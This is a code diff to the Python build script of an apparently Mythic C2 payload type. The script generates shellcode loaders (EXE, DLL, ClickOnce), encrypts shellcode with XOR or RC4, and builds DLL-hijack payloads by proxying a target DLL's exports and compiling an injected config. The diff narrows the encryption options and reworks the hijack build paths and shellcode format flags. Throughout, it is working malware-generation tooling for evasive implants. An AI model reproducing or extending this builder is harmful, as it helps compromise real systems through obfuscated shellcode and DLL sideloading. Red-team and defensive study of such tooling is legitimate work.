@@ -41,14 +41,14 @@ from pathlib import Path
 
 
 ENCRYPTION_METHODS = {
-    "AES128_CBC" :  "aes_128",
-    "AES256_CBC" :  "aes_cbc",
-    "AES256_ECB" :  "aes_ecb",
-    "CHACHA20"   :  "chacha20",
+    # "AES128_CBC" :  "aes_128",
+    # "AES256_CBC" :  "aes_cbc",
+    # "AES256_ECB" :  "aes_ecb",
+    # "CHACHA20"   :  "chacha20",
     "RC4"        :  "rc4",
-    "SALSA20"    :  "salsa20",
+    # "SALSA20"    :  "salsa20",
     "XOR"        :  "xor",
-    "XOR_COMPLEX":  "xor_complex",
+    # "XOR_COMPLEX":  "xor_complex",
 }
 
 COMPRESSION_METHODS = {
@@ -130,7 +130,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         BuildParameter(
             name = "0.1 Loader Type",
             parameter_type = BuildParameterType.ChooseOne,
-            description = "Select the loader's filetype.",
+            description = "Select the type of loader to use",
             choices = ["ClickOnce", "Shellcode Loader"],
             default_value = "Shellcode Loader",
             hide_conditions = [
@@ -141,7 +141,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         BuildParameter(
             name = "0.2 Loader Format",
             parameter_type = BuildParameterType.ChooseOne,
-            description = f"Select the loader's filetype. (DLL Unsupported in {semver})",
+            description = f"Select the loader's filetype",
             choices = ["EXE", "DLL"],
             default_value = "EXE",
             hide_conditions = [
@@ -297,18 +297,23 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             default_value="NONE"
         ),
 
+#
+# TODO:
+# Add more decryption support to loaders
+#
         BuildParameter(
             name = "2.1 Encryption Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encryption type for the shellcode.",
             choices = [
-                "AES128_CBC",
-                "AES256_CBC",
-                "AES256_ECB",
-                "CHACHA20",
-                "SALSA20",
+                # "AES128_CBC",
+                # "AES256_CBC",
+                # "AES256_ECB",
+                # "CHACHA20",
+                # "SALSA20",
+                "RC4",
                 "XOR",
-                "XOR_COMPLEX",
+                # "XOR_COMPLEX",
             ],
             default_value = "XOR"
         ),
@@ -852,6 +857,9 @@ generated if none have been entered.""",
             mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
             mythic_shellcode_path = str(mythic_shellcode_path)
 
+            hijack_dir = PurePath(agent_build_path) / "hijack"
+            hijack_dir_str = str(hijack_dir)
+
             obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
             obfuscated_shellcode_path = str(obfuscated_shellcode_path)
 
@@ -869,13 +877,12 @@ generated if none have been entered.""",
             shellcrypt_path = str(shellcrypt_path)
 
             templates_path = PurePath(agent_build_path) / "templates"
-            dll_hijack_path = templates_path / "dll_hijack.cpp"
-            dll_target_path = templates_path / "dll_hijack.dll"
             dll_exports_path = templates_path / "proxy.def"
 
-            templates_path = str(templates_path)
-            dll_hijack_template_path = str(dll_hijack_template_path)
+            dll_target_path = hijack_dir / "main.cpp"
             dll_target_path = str(dll_target_path)
+
+            templates_path = str(templates_path)
             dll_exports_path = str(dll_exports_path)
 
             os.mkdir(path=Path(agent_build_path) / "payload")
@@ -938,13 +945,16 @@ generated if none have been entered.""",
                 # "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
             ]
 
+            if self.get_parameter("0.0 Main Payload Type") == "Hijack":
+                cmd += ["-f", "csharp"]
+
             match self.get_parameter("0.1 Loader Type"):
                 case "ClickOnce":
                     cmd += ["-f", "csharp"]
                 case "Shellcode Loader":
                     cmd += ["-f", "c"]
                 case _:
-                    pass
+                    cmd += ["-f", "c"]
 
             if self.get_parameter("2.4 Shellcode Format") != "Raw":
                 cmd += ["-a", "shellcode"]
@@ -957,8 +967,6 @@ generated if none have been entered.""",
 
             if self.get_parameter("2.2 Encryption Key") != "NONE":
                 cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
-            else: 
-                cmd += ["-k", "0000"]
 
             cmd += ["-o", obfuscated_shellcode_path]
 
@@ -1087,13 +1095,7 @@ generated if none have been entered.""",
                 payload_path = PurePath(agent_build_path) / "payload" / dll_file_name
                 payload_path = str(payload_path)
 
-                with open(dll_target_path, "wb") as file:
-                    file.write(file_content)
-
                 exports = await generate_proxies(dll_file=dll_target_path,dll_file_name=dll_file_name)
-
-                with open(obfuscated_shellcode_path, "r") as file:
-                    shellcode_content = file.read()
 
                 exports_list = {
                     "EXPORTS": exports
@@ -1106,7 +1108,7 @@ generated if none have been entered.""",
                     file.write(proxy_output)
 
                 # Check if the file size stayed the same as the template
-                if os.stat(dll_hijack_template_path).st_size == 1598 or os.stat(dll_exports_path).st_size == 13:
+                if os.stat(dll_target_path).st_size >= 2688 or os.stat(dll_exports_path).st_size == 13:
                     response.status = BuildStatus.Error
                     response.build_message = "Failed to proxy the given file."
                     await SendMythicRPCPayloadUpdatebuildStep(
@@ -1128,10 +1130,6 @@ generated if none have been entered.""",
                         StepSuccess=True,
                     ))
 
-                # Get the hijack directory (source of all hijack files)
-                hijack_dir = PurePath(agent_build_path) / "hijack"
-                hijack_dir_str = str(hijack_dir)
-                
                 # Load and render the config.hpp template
                 config_template = environment.get_template("config.hpp")
                 config_data = {
@@ -1140,13 +1138,12 @@ generated if none have been entered.""",
                 }
                 rendered_config = config_template.render(**config_data)
 
+                config_hpp_destination = PurePath(hijack_dir) / "config.hpp"
+                config_hpp_destination = str(config_hpp_destination)
+
                 # Write the rendered config to the destination
-                with open(config_hpp_destination, "w") as config_file:
+                with open(config_hpp_destination, "w", encoding="utf-8") as config_file:
                     config_file.write(rendered_config)
-                
-                # Copy config file to the hijack directory
-                shutil.copy(src=str(config_hpp_destination),
-                            dst=str(hijack_dir / "config.hpp"))
 
                 # Use make to compile the DLL with all hijack directory files
                 cmd = [
